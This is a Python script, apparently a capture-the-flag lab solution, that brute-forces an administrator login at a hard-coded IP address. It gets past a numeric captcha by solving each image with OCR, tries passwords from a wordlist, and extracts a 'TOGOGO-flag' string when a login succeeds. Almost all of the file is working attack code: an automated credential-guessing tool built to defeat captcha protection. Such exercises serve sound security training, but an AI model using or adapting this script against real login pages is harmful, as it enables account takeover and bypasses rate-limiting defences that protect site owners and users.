#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
11-brute-captcha-flaw

思路：
1. 使用同一个 requests.Session() 保持 PHPSESSID。
2. 每次 GET /yanzhengma.php 获取验证码图片。
3. 使用 ddddocr 识别数字验证码。
4. 带 username/password/captcha POST 登录。
5. 用 password2.txt 爆破 administrator 的密码，成功后提取 flag。

依赖：
    pip install requests ddddocr
"""
#!/usr/bin/env python3
import random, re, time, io
from pathlib import Path
import requests
from PIL import Image
import ddddocr

import requests


BASE_URL = "http://47.120.76.57:33856"
CAPTCHA_URL = f"{BASE_URL}/yanzhengma.php"
LOGIN_URL = f"{BASE_URL}/login.php"
USERNAME = "administrator"
PASSWORD_FILE = Path(__file__).with_name("password2.txt")
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")


def preprocess(img_bytes: bytes) -> bytes:
    img = Image.open(io.BytesIO(img_bytes)).convert("L")
    img = img.point(lambda x: 0 if x < 140 else 255, "1").convert("RGB")
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


class CaptchaBruter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0"
        self.ocr = ddddocr.DdddOcr(show_ad=False, beta=True)

    def get_captcha(self) -> str:
        resp = self.session.get(
            CAPTCHA_URL,
            params={"nocache": str(random.random())},
            timeout=10,
        )
        raw = self.ocr.classification(preprocess(resp.content))
        return "".join(c for c in raw if c.isdigit())

    def get_valid_captcha(self) -> str:
        while True:
            code = self.get_captcha()
            if len(code) == 4:
                return code
            print(f"[~] OCR got {code!r}, retrying...")
            time.sleep(0.2)

    def login_once(self, password: str) -> tuple:
        code = self.get_valid_captcha()
        resp = self.session.post(
        LOGIN_URL,
        data={"name": USERNAME, "pwd": password, "yzm": code, "login": "登录"},
        timeout=10,
        allow_redirects=True,
        )
        text = resp.text

        # 调试：打印服务器返回（前300字符）
        print(f"  [DEBUG] captcha={code} | resp={text[:200].strip()}")

        flag = FLAG_RE.search(text)
        if flag:
            return True, code, flag.group(0)

        # 验证码错误 → 重试同一个密码
        if "验证码" in text and any(k in text for k in ["不正确", "错误", "wrong", "invalid"]):
            print(f"  [~] captcha wrong, retry same password")
            return self.login_once(password)

        print(f"  [-] {password:<16} captcha={code} failed")
        return False, code, None


def main():
    passwords = [
        l.strip()
        for l in Path(PASSWORD_FILE).read_text(encoding="utf-8", errors="ignore").splitlines()
        if l.strip() and not l.startswith("#")
    ]
    print(f"[+] {len(passwords)} passwords loaded")

    bruter = CaptchaBruter()

    for i, pwd in enumerate(passwords, 1):
        print(f"[*] {i}/{len(passwords)}: {pwd}")
        ok, code, flag = bruter.login_once(pwd)
        if ok:
            print(f"\n[+] password = {pwd}")
            print(f"[+] flag     = {flag}")
            return
        time.sleep(0.1)

    print("[-] not found")


if __name__ == "__main__":
    main()